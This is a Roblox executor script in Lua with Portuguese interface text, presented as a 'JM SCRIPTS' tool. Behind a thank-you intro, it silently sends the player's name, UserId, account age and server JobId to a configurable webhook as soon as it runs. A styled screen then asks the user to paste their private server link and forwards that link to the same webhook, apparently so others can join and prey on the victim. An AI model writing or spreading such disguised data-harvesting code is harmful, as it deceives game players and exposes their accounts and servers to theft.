--========================
-- CONFIG
--========================
local WEBHOOK_URL = "COLE_SEU_WEBHOOK_SLACK_AQUI"

--========================
-- SERVICES
--========================
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

local request =
    (syn and syn.request)
    or http_request
    or request
    or (fluxus and fluxus.request)

--========================
-- WEBHOOK FUNCTION
--========================
local function sendWebhook(msg)

    if not request then
        warn("Executor não suporta request")
        return
    end

    local data = {
        text = msg
    }

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })

end

--========================
-- EXECUTION LOG
--========================
sendWebhook(
"🚀 SCRIPT EXECUTADO\n"..
"👤 Player: "..player.Name.."\n"..
"🆔 UserId: "..player.UserId.."\n"..
"📅 AccountAge: "..player.AccountAge.."\n"..
"🌍 JobId: "..game.JobId
)

--========================
-- GUI BASE
--========================
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = game.CoreGui

--========================
-- INTRO
--========================
local intro = Instance.new("Frame", gui)
intro.Size = UDim2.fromScale(1,1)
intro.BackgroundColor3 = Color3.fromRGB(0,0,0)

local introText = Instance.new("TextLabel", intro)
introText.Size = UDim2.fromScale(1,1)
introText.BackgroundTransparency = 1
introText.Font = Enum.Font.Gotham
introText.TextScaled = true
introText.TextColor3 = Color3.fromRGB(200,170,255)
introText.TextTransparency = 1
introText.Text = "Obrigado por usar\nJM SCRIPTS 💜"

TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=0}):Play()

task.wait(2.5)

TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=1}):Play()

task.wait(1)

intro:Destroy()

--========================
-- MAIN UI
--========================
local main = Instance.new("Frame", gui)
main.Size = UDim2.fromScale(1,1)
main.BackgroundColor3 = Color3.fromRGB(6,6,12)

local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 2

task.spawn(function()

    local t = 0

    while main.Parent do

        t += 0.01
        stroke.Color = Color3.fromHSV(t%1,0.6,1)

        task.wait()

    end

end)

--========================
-- TITLE
--========================
local title = Instance.new("TextLabel", main)
title.Size = UDim2.fromScale(1,0.15)
title.BackgroundTransparency = 1
title.Text = "JM SCRIPTS"
title.Font = Enum.Font.GothamSemibold
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(190,140,255)

--========================
-- INPUT
--========================
local box = Instance.new("TextBox", main)
box.Position = UDim2.fromScale(0.2,0.35)
box.Size = UDim2.fromScale(0.6,0.08)
box.PlaceholderText = "Cole o link do seu servidor privado"
box.TextScaled = true
box.Font = Enum.Font.Gotham
box.BackgroundColor3 = Color3.fromRGB(20,20,35)
box.TextColor3 = Color3.new(1,1,1)

Instance.new("UICorner", box).CornerRadius = UDim.new(0,14)

--========================
-- SEND BUTTON
--========================
local send = Instance.new("TextButton", main)
send.Position = UDim2.fromScale(0.35,0.47)
send.Size = UDim2.fromScale(0.3,0.08)

send.Text = "Enviar"
send.TextScaled = true
send.Font = Enum.Font.GothamSemibold

send.BackgroundColor3 = Color3.fromRGB(140,70,220)
send.TextColor3 = Color3.new(1,1,1)

Instance.new("UICorner", send).CornerRadius = UDim.new(0,16)

send.MouseButton1Click:Connect(function()

    if box.Text == "" then return end

    sendWebhook(
    "🔗 SERVER PRIVADO\n"..
    "👤 "..player.Name.."\n"..
    "📎 "..box.Text
    )

    send.Text = "Enviado ✔"

end)
